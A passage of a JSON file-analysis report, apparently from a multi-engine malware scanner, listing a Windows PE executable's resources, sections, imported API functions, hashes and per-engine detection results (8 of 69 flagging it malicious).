            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 1.9943417310714722,
            "chi2": 660850,
            "filetype": "unknown",
            "sha256": "3e589556ab1b9a8748e0bade0fa34384f9d4d459dc23a38c00d201b348616da1",
            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 0.9389124512672424,
            "chi2": 3066691.75,
            "filetype": "unknown",
            "sha256": "ada2a6ecf3b4b0fcdad4140d58bf00ee725773eb349a2ebacf0f4915b696fe80",
            "type": "RT_CURSOR"
          },
          {
            "lang": "NEUTRAL",
            "entropy": 1.0596882104873657,
            "chi2": 3001733,
            "filetype": "unknown",
            "sha256": "7d7e213c43cc333981eef5974e0db54ec79fa7c8e12e86e5c1c4ee74d5852dfb",
            "type": "RT_CURSOR"
          }
        ],
        "resource_types": {
          "UNICODEDATA": 6,
          "RT_ICON": 14,
          "RT_DIALOG": 2,
          "RT_GROUP_CURSOR": 44,
          "RT_RCDATA": 104,
          "RT_MANIFEST": 1,
          "RT_STRING": 109,
          "DXSKINS": 2,
          "MAD": 2,
          "SVG": 42,
          "RT_BITMAP": 73,
          "RT_CURSOR": 107,
          "RT_VERSION": 1,
          "PNG": 27,
          "RT_GROUP_ICON": 9
        },
        "imphash": "43e22b2a2572d166d66aab5b012901e9",
        "overlay": {
          "entropy": 7.495565414428711,
          "offset": 21140480,
          "chi2": 9959.31,
          "filetype": "unknown",
          "size": 8504,
          "md5": "2a308a38653da76a4addd77afb79ea45"
        },
        "resource_langs": {
          "NEUTRAL": 430,
          "ENGLISH US": 113
        },
        "machine_type": 332,
        "timestamp": 1698238264,
        "entry_point": 15744528,
        "sections": [
          {
            "name": ".text",
            "chi2": 142371392,
            "virtual_address": 4096,
            "entropy": 6.51,
            "raw_size": 15697408,
            "flags": "rx",
            "virtual_size": 15696992,
            "md5": "4855fa6b34d8fce2d5adabacdfbc917b"
          },
          {
            "name": ".itext",
            "chi2": 499755.91,
            "virtual_address": 15704064,
            "entropy": 6.25,
            "raw_size": 40960,
            "flags": "rx",
            "virtual_size": 40500,
            "md5": "29c50e12004e6595859fd42f07930317"
          },
          {
            "name": ".data",
            "chi2": 7050159,
            "virtual_address": 15745024,
            "entropy": 5.84,
            "raw_size": 215040,
            "flags": "rw",
            "virtual_size": 214820,
            "md5": "cd8e0037008e404d9c75ee884e7ffc51"
          },
          {
            "name": ".bss",
            "chi2": -1,
            "virtual_address": 15962112,
            "entropy": 0,
            "raw_size": 0,
            "flags": "rw",
            "virtual_size": 788000,
            "md5": "d41d8cd98f00b204e9800998ecf8427e"
          },
          {
            "name": ".idata",
            "chi2": 429064.12,
            "virtual_address": 16752640,
            "entropy": 5.34,
            "raw_size": 24576,
            "flags": "rw",
            "virtual_size": 24528,
            "md5": "e30285bb601e4182691498901dc5adc6"
          },
          {
            "name": ".didata",
            "chi2": 908185.56,
            "virtual_address": 16777216,
            "entropy": 5.01,
            "raw_size": 33792,
            "flags": "rw",
            "virtual_size": 33292,
            "md5": "ffc60360b289094410bafef34a7169aa"
          },
          {
            "name": ".edata",
            "chi2": 84999,
            "virtual_address": 16814080,
            "entropy": 1.65,
            "raw_size": 512,
            "flags": "r",
            "virtual_size": 138,
            "md5": "0d622e3eb78e9a45b335bab68342dfbd"
          },
          {
            "name": ".tls",
            "chi2": -1,
            "virtual_address": 16818176,
            "entropy": 0,
            "raw_size": 0,
            "flags": "rw",
            "virtual_size": 1640,
            "md5": "d41d8cd98f00b204e9800998ecf8427e"
          },
          {
            "name": ".rdata",
            "chi2": 91636,
            "virtual_address": 16822272,
            "entropy": 1.45,
            "raw_size": 512,
            "flags": "r",
            "virtual_size": 93,
            "md5": "708c0374c24e693e27aeb5136dcf5fc2"
          },
          {
            "name": ".reloc",
            "chi2": 5208648,
            "virtual_address": 16826368,
            "entropy": 6.68,
            "raw_size": 1383936,
            "flags": "r",
            "virtual_size": 1383472,
            "md5": "44a62fddd66cc0e134a06b11643e6ae3"
          },
          {
            "name": ".rsrc",
            "chi2": 105238208,
            "virtual_address": 18210816,
            "entropy": 6.03,
            "raw_size": 3742720,
            "flags": "r",
            "virtual_size": 3742292,
            "md5": "8977abe54fa0068836d28193e40c2b7e"
          }
        ],
        "import_list": [
          {
            "library_name": "gdi32.dll",
            "imported_functions": [
              "AbortDoc",
              "AddFontMemResourceEx",
              "AddFontResourceExW",
              "AngleArc",
              "Arc",
              "ArcTo",
              "BeginPath",
              "BitBlt",
              "Chord",
              "CloseEnhMetaFile",
              "CombineRgn",
              "CombineTransform",
              "CopyEnhMetaFileW",
              "CreateBitmap",
              "CreateBrushIndirect",
              "CreateCompatibleBitmap",
              "CreateCompatibleDC",
              "CreateDCW",
              "CreateDIBitmap",
              "CreateDIBSection",
              "CreateEllipticRgn",
              "CreateEnhMetaFileW",
              "CreateFontA",
              "CreateFontIndirectA",
              "CreateFontIndirectW",
              "CreateFontW",
              "CreateHalftonePalette",
              "CreateICW",
              "CreatePalette",
              "CreatePatternBrush",
              "CreatePen",
              "CreatePenIndirect",
              "CreatePolygonRgn",
              "CreateRectRgn",
              "CreateRectRgnIndirect",
              "CreateRoundRectRgn",
              "CreateSolidBrush",
              "DeleteDC",
              "DeleteEnhMetaFile",
              "DeleteObject",
              "DPtoLP",
              "Ellipse",
              "EndDoc",
              "EndPage",
              "EndPath",
              "EnumFontFamiliesExW",
              "EnumFontFamiliesW",
              "EnumFontsW",
              "EqualRgn",
              "ExcludeClipRect",
              "ExtCreateRegion",
              "ExtFloodFill",
              "ExtSelectClipRgn",
              "ExtTextOutW",
              "FillPath",
              "FillRgn",
              "FrameRgn",
              "GdiFlush",
              "GetBitmapBits",
              "GetBkMode",
              "GetBrushOrgEx",
              "GetCharABCWidthsFloatW",
              "GetCharacterPlacementW",
              "GetClipBox",
              "GetClipRgn",
              "GetCurrentObject",
              "GetCurrentPositionEx",
              "GetDeviceCaps",
              "GetDIBColorTable",
              "GetDIBits",
              "GetEnhMetaFileBits",
              "GetEnhMetaFileDescriptionW",
              "GetEnhMetaFileHeader",
              "GetEnhMetaFilePaletteEntries",
              "GetFontData",
              "GetFontUnicodeRanges",
              "GetGlyphIndicesW",
              "GetGlyphOutlineW",
              "GetKerningPairs",
              "GetNearestColor",
              "GetNearestPaletteIndex",
              "GetObjectA",
              "GetObjectType",
              "GetObjectW",
              "GetOutlineTextMetricsW",
              "GetPaletteEntries",
              "GetPixel",
              "GetRandomRgn",
              "GetRegionData",
              "GetRgnBox",
              "GetROP2",
              "GetStockObject",
              "GetStretchBltMode",
              "GetSystemPaletteEntries",
              "GetTextAlign",
              "GetTextCharset",
              "GetTextCharsetInfo",
              "GetTextColor",
              "GetTextExtentExPointW",
              "GetTextExtentPoint32A",
              "GetTextExtentPoint32W",
              "GetTextExtentPointW",
              "GetTextFaceA",
              "GetTextFaceW",
              "GetTextMetricsA",
              "GetTextMetricsW",
              "GetViewportOrgEx",
              "GetWindowOrgEx",
              "GetWinMetaFileBits",
              "GetWorldTransform",
              "IntersectClipRect",
              "LineTo",
              "LPtoDP",
              "MaskBlt",
              "ModifyWorldTransform",
              "MoveToEx",
              "OffsetClipRgn",
              "OffsetRgn",
              "PatBlt",
              "PathToRegion",
              "Pie",
              "PlayEnhMetaFile",
              "PolyBezier",
              "PolyBezierTo",
              "Polygon",
              "Polyline",
              "PtInRegion",
              "PtVisible",
              "RealizePalette",
              "Rectangle",
              "RectInRegion",
              "RectVisible",
              "RemoveFontMemResourceEx",
              "RemoveFontResourceExW",
              "ResizePalette",
              "RestoreDC",
              "RoundRect",
              "SaveDC",
              "SelectClipRgn",
              "SelectObject",
              "SelectPalette",
              "SetAbortProc",
              "SetBkColor",
              "SetBkMode",
              "SetBrushOrgEx",
              "SetDCPenColor",
              "SetDIBColorTable",
              "SetDIBits",
              "SetEnhMetaFileBits",
              "SetGraphicsMode",
              "SetLayout",
              "SetMapMode",
              "SetPixel",
              "SetRectRgn",
              "SetROP2",
              "SetStretchBltMode",
              "SetTextAlign",
              "SetTextColor",
              "SetTextJustification",
              "SetViewportOrgEx",
              "SetWindowOrgEx",
              "SetWinMetaFileBits",
              "SetWorldTransform",
              "StartDocA",
              "StartDocW",
              "StartPage",
              "StretchBlt",
              "StretchDIBits",
              "TextOutA",
              "TextOutW",
              "TranslateCharsetInfo",
              "UnrealizeObject",
              "WidenPath"
            ]
          },
          {
            "library_name": "comdlg32.dll",
            "imported_functions": [
              "GetOpenFileNameW",
              "GetSaveFileNameA",
              "GetSaveFileNameW",
              "PrintDlgW"
            ]
          },
          {
            "library_name": "wsock32.dll",
            "imported_functions": [
              "bind",
              "closesocket",
              "connect",
              "gethostbyname",
              "gethostname",
              "htons",
              "inet_addr",
              "inet_ntoa",
              "ioctlsocket",
              "ntohl",
              "recv",
              "recvfrom",
              "select",
              "send",
              "sendto",
              "setsockopt",
              "socket",
              "WSACleanup",
              "WSAGetLastError",
              "WSAStartup"
            ]
          },
          {
            "library_name": "version.dll",
            "imported_functions": [
              "GetFileVersionInfoA",
              "GetFileVersionInfoSizeA",
              "GetFileVersionInfoSizeW",
              "GetFileVersionInfoW",
              "VerQueryValueA",
              "VerQueryValueW"
            ]
          },
          {
            "library_name": "winmm.dll",
            "imported_functions": [
              "PlaySoundW",
              "sndPlaySoundW",
              "timeGetTime"
            ]
          },
          {
            "library_name": "wininet.dll",
            "imported_functions": [
              "InternetCloseHandle",
              "InternetOpenA",
              "InternetOpenUrlA",
              "InternetQueryOptionW",
              "InternetReadFile"
            ]
          },
          {
            "library_name": "wintrust.dll",
            "imported_functions": [
              "WinVerifyTrust"
            ]
          },
          {
            "library_name": "shell32.dll",
            "imported_functions": [
              "DragQueryFileW",
              "SHAppBarMessage",
              "SHChangeNotify",
              "Shell_NotifyIconW",
              "ShellExecuteA",
              "ShellExecuteExA",
              "ShellExecuteExW",
              "ShellExecuteW",
              "SHGetDesktopFolder",
              "SHGetFileInfoW",
              "SHGetFolderPathW",
              "SHGetMalloc",
              "SHGetPathFromIDListA",
              "SHGetSpecialFolderLocation"
            ]
          },
          {
            "library_name": "kernel32.dll",
            "imported_functions": [
              "Beep",
              "CloseHandle",
              "CompareStringA",
              "CompareStringW",
              "ConnectNamedPipe",
              "CopyFileA",
              "CopyFileW",
              "CreateDirectoryA",
              "CreateDirectoryW",
              "CreateEventA",
              "CreateEventW",
              "CreateFileA",
              "CreateFileMappingA",
              "CreateFileMappingW",
              "CreateFileW",
              "CreateMutexA",
              "CreateMutexW",
              "CreateNamedPipeW",
              "CreatePipe",
              "CreateProcessA",
              "CreateProcessW",
              "CreateSemaphoreW",
              "CreateThread",
              "DeleteCriticalSection",
              "DeleteFileA",
              "DeleteFileW",
              "DeviceIoControl",
              "DisconnectNamedPipe",
              "DuplicateHandle",
              "EnterCriticalSection",
              "EnumCalendarInfoW",
              "EnumResourceNamesW",
              "EnumSystemLocalesW",
              "ExitProcess",
              "ExitThread",
              "ExpandEnvironmentStringsA",
              "ExpandEnvironmentStringsW",
              "FileTimeToDosDateTime",
              "FileTimeToLocalFileTime",
              "FileTimeToSystemTime",
              "FindClose",
              "FindFirstFileA",
              "FindFirstFileW",
              "FindNextFileA",
              "FindNextFileW",
              "FindResourceA",
              "FindResourceW",
              "FlushFileBuffers",
              "FlushInstructionCache",
              "FlushViewOfFile",
              "FormatMessageA",
              "FormatMessageW",
              "FreeLibrary",
              "FreeResource",
              "GetACP",
              "GetCommandLineA",
              "GetCommandLineW",
              "GetComputerNameA",
              "GetComputerNameExW",
              "GetComputerNameW",
              "GetConsoleCP",
              "GetConsoleOutputCP",
              "GetCPInfo",
              "GetCPInfoExW",
              "GetCurrentDirectoryA",
              "GetCurrentDirectoryW",
              "GetCurrentProcess",
              "GetCurrentProcessId",
              "GetCurrentThread",
              "GetCurrentThreadId",
              "GetDateFormatW",
              "GetDiskFreeSpaceA",
              "GetDiskFreeSpaceW",
              "GetDriveTypeW",
              "GetEnvironmentVariableW",
              "GetExitCodeProcess",
              "GetExitCodeThread",
              "GetFileAttributesA",
              "GetFileAttributesExW",
              "GetFileAttributesW",
              "GetFileSize",
              "GetFileTime",
              "GetFileType",
              "GetFullPathNameW",
              "GetGeoInfoW",
              "GetHandleInformation",
              "GetLastError",
              "GetLocaleInfoA",
              "GetLocaleInfoW",
              "GetLocalTime",
              "GetLogicalDrives",
              "GetLogicalDriveStringsW",
              "GetLongPathNameW",
              "GetModuleFileNameA",
              "GetModuleFileNameW",
              "GetModuleHandleA",
              "GetModuleHandleW",
              "GetPrivateProfileStringW",
              "GetProcAddress",
              "GetProcessHeap",
              "GetStartupInfoW",
              "GetStdHandle",
              "GetStringTypeExA",
              "GetStringTypeExW",
              "GetStringTypeW",
              "GetSystemDefaultLangID",
              "GetSystemDefaultUILanguage",
              "GetSystemDirectoryW",
              "GetSystemInfo",
              "GetSystemTime",
              "GetTempPathA",
              "GetTempPathW",
              "GetThreadContext",
              "GetThreadLocale",
              "GetThreadPriority",
              "GetTickCount",
              "GetTimeZoneInformation",
              "GetUserDefaultLCID",
              "GetUserDefaultUILanguage",
              "GetUserGeoID",
              "GetVersion",
              "GetVersionExA",
              "GetVersionExW",
              "GetVolumeInformationW",
              "GetWindowsDirectoryA",
              "GlobalAddAtomW",
              "GlobalAlloc",
              "GlobalDeleteAtom",
              "GlobalFindAtomW",
              "GlobalFree",
              "GlobalHandle",
              "GlobalLock",
              "GlobalMemoryStatus",
              "GlobalSize",
              "GlobalUnlock",
              "HeapAlloc",
              "HeapCreate",
              "HeapDestroy",
              "HeapFree",
              "InitializeCriticalSection",
              "InitializeCriticalSectionAndSpinCount",
              "IsBadReadPtr",
              "IsDBCSLeadByteEx",
              "IsDebuggerPresent",
              "IsValidLocale",
              "LCMapStringW",
              "LeaveCriticalSection",
              "LoadLibraryA",
              "LoadLibraryExA",
              "LoadLibraryExW",
              "LoadLibraryW",
              "LoadResource",
              "LocalAlloc",
              "LocalFree",
              "LocalSize",
              "LockResource",
              "lstrcmpA",
              "lstrcmpiW",
              "lstrcmpW",
              "lstrlenW",
              "MapViewOfFile",
              "MapViewOfFileEx",
              "MoveFileW",
              "MulDiv",
              "MultiByteToWideChar",
              "OpenEventW",
              "OpenFileMappingA",
              "OpenFileMappingW",
              "OpenProcess",
              "OpenSemaphoreW",
              "OutputDebugStringW",
              "PeekNamedPipe",
              "QueryDosDeviceW",
              "QueryPerformanceCounter",
              "QueryPerformanceFrequency",
              "RaiseException",
              "ReadFile",
              "ReadProcessMemory",
              "ReleaseMutex",
              "ReleaseSemaphore",
              "RemoveDirectoryA",
              "RemoveDirectoryW",
              "ResetEvent",
              "ResumeThread",
              "RtlUnwind",
              "SetCurrentDirectoryW",
              "SetEndOfFile",
              "SetErrorMode",
              "SetEvent",
              "SetFileAttributesA",
              "SetFileAttributesW",
              "SetFilePointer",
              "SetFileTime",
              "SetHandleInformation",
              "SetLastError",
              "SetNamedPipeHandleState",
              "SetPriorityClass",
              "SetProcessShutdownParameters",
              "SetThreadExecutionState",
              "SetThreadLocale",
              "SetThreadPriority",
              "SetUnhandledExceptionFilter",
              "SizeofResource",
              "Sleep",
              "SleepEx",
              "SuspendThread",
              "SwitchToThread",
              "SystemTimeToFileTime",
              "SystemTimeToTzSpecificLocalTime",
              "TerminateProcess",
              "TerminateThread",
              "TlsGetValue",
              "TlsSetValue",
              "TryEnterCriticalSection",
              "TzSpecificLocalTimeToSystemTime",
              "UnhandledExceptionFilter",
              "UnmapViewOfFile",
              "VerifyVersionInfoW",
              "VerSetConditionMask",
              "VirtualAlloc",
              "VirtualFree",
              "VirtualProtect",
              "VirtualQuery",
              "VirtualQueryEx",
              "WaitForMultipleObjects",
              "WaitForMultipleObjectsEx",
              "WaitForSingleObject",
              "WaitNamedPipeW",
              "WideCharToMultiByte",
              "WriteFile",
              "WritePrivateProfileStringW"
            ]
          },
          {
            "library_name": "msvcrt.dll",
            "imported_functions": [
              "memcpy",
              "memset"
            ]
          },
          {
            "library_name": "oleaut32.dll",
            "imported_functions": [
              "CreateErrorInfo",
              "GetActiveObject",
              "GetErrorInfo",
              "SafeArrayAccessData",
              "SafeArrayCreate",
              "SafeArrayCreateVector",
              "SafeArrayGetElement",
              "SafeArrayGetLBound",
              "SafeArrayGetUBound",
              "SafeArrayPtrOfIndex",
              "SafeArrayPutElement",
              "SafeArrayUnaccessData",
              "SetErrorInfo",
              "SysAllocStringLen",
              "SysFreeString",
              "SysReAllocStringLen",
              "VariantChangeType",
              "VariantClear",
              "VariantCopy",
              "VariantCopyInd",
              "VariantInit"
            ]
          },
          {
            "library_name": "shlwapi.dll",
            "imported_functions": [
              "SHCreateStreamOnFileW"
            ]
          },
          {
            "library_name": "winhttp.dll",
            "imported_functions": [
              "WinHttpAddRequestHeaders",
              "WinHttpCloseHandle",
              "WinHttpConnect",
              "WinHttpGetIEProxyConfigForCurrentUser",
              "WinHttpGetProxyForUrl",
              "WinHttpOpen",
              "WinHttpOpenRequest",
              "WinHttpQueryAuthSchemes",
              "WinHttpQueryDataAvailable",
              "WinHttpQueryHeaders",
              "WinHttpQueryOption",
              "WinHttpReadData",
              "WinHttpReceiveResponse",
              "WinHttpSendRequest",
              "WinHttpSetCredentials",
              "WinHttpSetOption",
              "WinHttpSetStatusCallback",
              "WinHttpSetTimeouts",
              "WinHttpWriteData"
            ]
          },
          {
            "library_name": "SHFolder.dll",
            "imported_functions": [
              "SHGetFolderPathW"
            ]
          },
          {
            "library_name": "wtsapi32.dll",
            "imported_functions": [
              "WTSQuerySessionInformationW"
            ]
          },
          {
            "library_name": "advapi32.dll",
            "imported_functions": [
              "AllocateAndInitializeSid",
              "ChangeServiceConfig2W",
              "ChangeServiceConfigW",
              "CloseServiceHandle",
              "ControlService",
              "ConvertSidToStringSidW",
              "CreateProcessAsUserW",
              "CreateServiceW",
              "CryptDecrypt",
              "CryptDestroyKey",
              "CryptEncrypt",
              "CryptReleaseContext",
              "DeleteService",
              "DeregisterEventSource",
              "DuplicateToken",
              "DuplicateTokenEx",
              "EnumServicesStatusW",
              "FreeSid",
              "GetNamedSecurityInfoW",
              "GetTokenInformation",
              "GetUserNameA",
              "GetUserNameW",
              "InitializeSecurityDescriptor",
              "LookupAccountNameW",
              "LookupAccountSidW",
              "OpenProcessToken",
              "OpenSCManagerW",
              "OpenServiceW",
              "QueryServiceConfig2W",
              "QueryServiceConfigW",
              "RegCloseKey",
              "RegConnectRegistryW",
              "RegCreateKeyExA",
              "RegCreateKeyExW",
              "RegDeleteKeyW",
              "RegDeleteValueA",
              "RegDeleteValueW",
              "RegDisablePredefinedCache",
              "RegEnumKeyExW",
              "RegEnumValueW",
              "RegFlushKey",
              "RegisterEventSourceW",
              "RegisterServiceCtrlHandlerExW",
              "RegLoadKeyW",
              "RegOpenKeyExA",
              "RegOpenKeyExW",
              "RegQueryInfoKeyW",
              "RegQueryValueExA",
              "RegQueryValueExW",
              "RegReplaceKeyW",
              "RegRestoreKeyW",
              "RegSaveKeyW",
              "RegSetKeySecurity",
              "RegSetValueExA",
              "RegSetValueExW",
              "RegUnLoadKeyW",
              "ReportEventW",
              "RevertToSelf",
              "SetEntriesInAclW",
              "SetNamedSecurityInfoW",
              "SetSecurityDescriptorDacl",
              "SetSecurityDescriptorOwner",
              "SetServiceStatus",
              "SetTokenInformation",
              "StartServiceCtrlDispatcherW",
              "StartServiceW"
            ]
          },
          {
            "library_name": "ole32.dll",
            "imported_functions": [
              "CLSIDFromProgID",
              "CLSIDFromString",
              "CoCreateInstance",
              "CoFreeUnusedLibraries",
              "CoGetClassObject",
              "CoInitialize",
              "CoInitializeEx",
              "CoLockObjectExternal",
              "CoTaskMemAlloc",
              "CoTaskMemFree",
              "CoUninitialize",
              "CreateStreamOnHGlobal",
              "DoDragDrop",
              "IsAccelerator",
              "IsEqualGUID",
              "OleDraw",
              "OleInitialize",
              "OleRegEnumVerbs",
              "OleSetMenuDescriptor",
              "OleUninitialize",
              "ProgIDFromCLSID",
              "RegisterDragDrop",
              "RevokeDragDrop",
              "StringFromCLSID"
            ]
          },
          {
            "library_name": "comctl32.dll",
            "imported_functions": [
              "_TrackMouseEvent",
              "FlatSB_GetScrollInfo",
              "FlatSB_GetScrollPos",
              "FlatSB_SetScrollInfo",
              "FlatSB_SetScrollPos",
              "FlatSB_SetScrollProp",
              "ImageList_Add",
              "ImageList_AddMasked",
              "ImageList_BeginDrag",
              "ImageList_Copy",
              "ImageList_Create",
              "ImageList_Destroy",
              "ImageList_DragEnter",
              "ImageList_DragLeave",
              "ImageList_DragMove",
              "ImageList_DragShowNolock",
              "ImageList_Draw",
              "ImageList_DrawEx",
              "ImageList_DrawIndirect",
              "ImageList_EndDrag",
              "ImageList_GetBkColor",
              "ImageList_GetDragImage",
              "ImageList_GetIcon",
              "ImageList_GetIconSize",
              "ImageList_GetImageCount",
              "ImageList_GetImageInfo",
              "ImageList_LoadImageW",
              "ImageList_Read",
              "ImageList_Remove",
              "ImageList_Replace",
              "ImageList_ReplaceIcon",
              "ImageList_SetBkColor",
              "ImageList_SetIconSize",
              "ImageList_SetImageCount",
              "ImageList_SetOverlayImage",
              "ImageList_Write",
              "InitCommonControls",
              "InitializeFlatSB"
            ]
          },
          {
            "library_name": "user32.dll",
            "imported_functions": [
              "ActivateKeyboardLayout",
              "AdjustWindowRectEx",
              "AppendMenuW",
              "AttachThreadInput",
              "BeginDeferWindowPos",
              "BeginPaint",
              "BringWindowToTop",
              "CallNextHookEx",
              "CallWindowProcA",
              "CallWindowProcW",
              "CharLowerBuffA",
              "CharLowerBuffW",
              "CharLowerW",
              "CharNextW",
              "CharToOemW",
              "CharUpperBuffA",
              "CharUpperBuffW",
              "CharUpperW",
              "CheckMenuItem",
              "ChildWindowFromPoint",
              "ChildWindowFromPointEx",
              "ClientToScreen",
              "CloseClipboard",
              "CloseDesktop",
              "CopyIcon",
              "CopyImage",
              "CountClipboardFormats",
              "CreateAcceleratorTableW",
              "CreateCaret",
              "CreateDialogParamW",
              "CreateIcon",
              "CreateIconIndirect",
              "CreateMenu",
              "CreatePopupMenu",
              "CreateWindowExA",
              "CreateWindowExW",
              "DeferWindowPos",
              "DefFrameProcW",
              "DefMDIChildProcW",
              "DefWindowProcA",
              "DefWindowProcW",
              "DeleteMenu",
              "DestroyCaret",
              "DestroyCursor",
              "DestroyIcon",
              "DestroyMenu",
              "DestroyWindow",
              "DispatchMessageA",
              "DispatchMessageW",
              "DrawEdge",
              "DrawFocusRect",
              "DrawFrameControl",
              "DrawIcon",
              "DrawIconEx",
              "DrawMenuBar",
              "DrawTextA",
              "DrawTextExW",
              "DrawTextW",
              "EmptyClipboard",
              "EnableMenuItem",
              "EnableScrollBar",
              "EnableWindow",
              "EndDeferWindowPos",
              "EndMenu",
              "EndPaint",
              "EnumChildWindows",
              "EnumClipboardFormats",
              "EnumDisplayMonitors",
              "EnumThreadWindows",
              "EnumWindows",
              "EqualRect",
              "ExitWindowsEx",
              "FillRect",
              "FindWindowA",
              "FindWindowExW",
              "FindWindowW",
              "FrameRect",
              "GetActiveWindow",
              "GetAncestor",
              "GetAsyncKeyState",
              "GetCapture",
              "GetCaretPos",
              "GetClassInfoExW",
              "GetClassInfoW",
              "GetClassLongW",
              "GetClassNameA",
              "GetClassNameW",
              "GetClientRect",
              "GetClipboardData",
              "GetComboBoxInfo",
              "GetCursor",
              "GetCursorInfo",
              "GetCursorPos",
              "GetDC",
              "GetDCEx",
              "GetDesktopWindow",
              "GetDlgCtrlID",
              "GetDlgItem",
              "GetDoubleClickTime",
              "GetFocus",
              "GetForegroundWindow",
              "GetGuiResources",
              "GetGUIThreadInfo",
              "GetIconInfo",
              "GetKeyboardLayout",
              "GetKeyboardLayoutList",
              "GetKeyboardLayoutNameW",
              "GetKeyboardState",
              "GetKeyNameTextW",
              "GetKeyState",
              "GetLastActivePopup",
              "GetListBoxInfo",
              "GetMenu",
              "GetMenuInfo",
              "GetMenuItemCount",
              "GetMenuItemID",
              "GetMenuItemInfoW",
              "GetMenuItemRect",
              "GetMenuState",
              "GetMenuStringW",
              "GetMessageA",
              "GetMessageExtraInfo",
              "GetMessagePos",
              "GetMessageTime",
              "GetMessageW",
              "GetMonitorInfoW",
              "GetParent",
              "GetProcessWindowStation",
              "GetPropW",
              "GetScrollBarInfo",
              "GetScrollInfo",
              "GetScrollPos",
              "GetScrollRange",
              "GetSubMenu",
              "GetSysColor",
              "GetSysColorBrush",
              "GetSystemMenu",
              "GetSystemMetrics",
              "GetTabbedTextExtentW",
              "GetThreadDesktop",
              "GetTopWindow",
              "GetUpdateRect",
              "GetUpdateRgn",
              "GetUserObjectInformationW",
              "GetWindow",
              "GetWindowDC",
              "GetWindowLongW",
              "GetWindowPlacement",
              "GetWindowRect",
              "GetWindowRgn",
              "GetWindowTextA",
              "GetWindowTextW",
              "GetWindowThreadProcessId",
              "HideCaret",
              "InflateRect",
              "InsertMenuItemW",
              "InsertMenuW",
              "IntersectRect",
              "InvalidateRect",
              "InvalidateRgn",
              "IsChild",
              "IsClipboardFormatAvailable",
              "IsDialogMessageA",
              "IsDialogMessageW",
              "IsIconic",
              "IsRectEmpty",
              "IsWindow",
              "IsWindowEnabled",
              "IsWindowUnicode",
              "IsWindowVisible",
              "IsZoomed",
              "keybd_event",
              "KillTimer",
              "LoadBitmapW",
              "LoadCursorW",
              "LoadIconW",
              "LoadImageA",
              "LoadImageW",
              "LoadKeyboardLayoutW",
              "LoadMenuW",
              "LoadStringW",
              "LockWindowUpdate",
              "LookupIconIdFromDirectoryEx",
              "MapVirtualKeyW",
              "MapWindowPoints",
              "MessageBeep",
              "MessageBoxA",
              "MessageBoxW",
              "MonitorFromPoint",
              "MonitorFromRect",
              "MonitorFromWindow",
              "mouse_event",
              "MoveWindow",
              "MsgWaitForMultipleObjects",
              "MsgWaitForMultipleObjectsEx",
              "NotifyWinEvent",
              "OemToCharA",
              "OffsetRect",
              "OpenClipboard",
              "OpenDesktopW",
              "OpenInputDesktop",
              "PeekMessageA",
              "PeekMessageW",
              "PostMessageA",
              "PostMessageW",
              "PostQuitMessage",
              "PostThreadMessageA",
              "PostThreadMessageW",
              "PtInRect",
              "RedrawWindow",
              "RegisterClassA",
              "RegisterClassExW",
              "RegisterClassW",
              "RegisterClipboardFormatW",
              "RegisterWindowMessageW",
              "ReleaseCapture",
              "ReleaseDC",
              "RemoveMenu",
              "RemovePropW",
              "ScreenToClient",
              "ScrollWindow",
              "ScrollWindowEx",
              "SendInput",
              "SendMessageA",
              "SendMessageTimeoutA",
              "SendMessageW",
              "SendNotifyMessageW",
              "SetActiveWindow",
              "SetCapture",
              "SetClassLongW",
              "SetClipboardData",
              "SetCursor",
              "SetCursorPos",
              "SetFocus",
              "SetForegroundWindow",
              "SetMenu",
              "SetMenuInfo",
              "SetMenuItemInfoW",
              "SetParent",
              "SetPropW",
              "SetRect",
              "SetRectEmpty",
              "SetScrollInfo",
              "SetScrollPos",
              "SetScrollRange",
              "SetThreadDesktop",
              "SetTimer",
              "SetWindowLongW",
              "SetWindowPlacement",
              "SetWindowPos",
              "SetWindowRgn",
              "SetWindowsHookExW",
              "SetWindowTextA",
              "SetWindowTextW",
              "ShowCaret",
              "ShowOwnedPopups"
            ]
          },
          {
            "library_name": "winspool.drv",
            "imported_functions": [
              "ClosePrinter",
              "DocumentPropertiesW",
              "EnumPrintersW",
              "GetDefaultPrinterW",
              "OpenPrinterW"
            ]
          }
        ]
      },
      "magic": "PE32 executable (GUI) Intel 80386, for MS Windows",
      "last_analysis_stats": {
        "harmless": 0,
        "type-unsupported": 4,
        "suspicious": 0,
        "confirmed-timeout": 0,
        "timeout": 1,
        "failure": 0,
        "malicious": 8,
        "undetected": 61
      },
      "last_analysis_results": {
        "Bkav": {
          "category": "undetected",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Lionic": {
          "category": "undetected",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "tehtris": {
          "category": "undetected",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "DrWeb": {
          "category": "undetected",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "MicroWorld-eScan": {
          "category": "undetected",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "ClamAV": {
          "category": "timeout",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "CMC": {
          "category": "undetected",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240125"
        },
        "CAT-QuickHeal": {
          "category": "undetected",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Skyhigh": {
          "category": "undetected",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "McAfee": {
          "category": "undetected",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240127"
        },
        "Malwarebytes": {
          "category": "undetected",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "result": null,
          "method": "blacklist",
          "engine_update": "20240126"
        },
        "Zillya": {
          "category": "undetected",
          "engine_name": "Zillya",
